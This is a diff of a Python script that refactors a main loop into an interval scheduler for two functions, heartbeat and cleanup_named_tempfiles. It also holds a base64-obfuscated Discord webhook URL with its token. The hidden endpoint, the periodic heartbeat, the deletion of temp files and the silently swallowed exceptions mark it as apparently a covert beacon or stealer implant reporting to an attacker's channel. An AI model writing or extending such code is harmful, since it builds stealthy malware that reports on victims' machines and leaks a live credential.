@@ -1,8 +1,7 @@
 import string, base64, json, re
 import os, socket, tempfile
 import urllib.request
-
-from time import time, sleep
+import time
 
 WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzAwNjk4NTAzMDI3MTA3Ni9xdUVRY0VxcEFGN3c2TUg4REduSlRtaTBuSUtFVGl2WXpMbEpVNlNSLUpsSWxGYmNLaUtFNDVlczZ1ZGxmOGVFQklBZw=="
 
@@ -64,7 +63,7 @@ def heartbeat():
 def cleanup_named_tempfiles():
     AGE_THRESHOLD = 60 
     temp_dir = tempfile.gettempdir()
-    now = time()
+    now = time.time()
 
     pattern = re.compile(r'^tmp[^.]{8}\.[^.]{3}$')
     for filename in os.listdir(temp_dir):
@@ -98,12 +97,45 @@ if __name__ == "__main__":
 
     FIRST_MESSAGE = True
     
+    # while True:
+    #     try:
+    #         cleanup_named_tempfiles()
+
+    #         heartbeat()
+    #     except:
+    #         pass
+
+    #     sleep(60)
+
+    loop_function_list = [
+        {
+            "func": cleanup_named_tempfiles,
+            "args": [],
+            "interval": 60,  # seconds
+            "next_run": time.monotonic(),
+        },
+        {
+            "func": heartbeat,
+            "args": [],
+            "interval": 60,  # seconds
+            "next_run": time.monotonic(),
+        }
+    ]
+
     while True:
-        try:
-            cleanup_named_tempfiles()
+        now = time.monotonic()
+        nearest_next_run = None
 
-            heartbeat()
-        except:
-            pass
+        for task in loop_function_list:
+            if now >= task["next_run"]:
+                task["next_run"] += task["interval"]
+                try:
+                    task["func"](*task["args"])
+                except Exception:
+                    pass
 
-        sleep(60)
+            if nearest_next_run is None or task["next_run"] < nearest_next_run:
+                nearest_next_run = task["next_run"]
+
+        sleep_time = max(0, nearest_next_run - time.monotonic())
+        time.sleep(sleep_time)
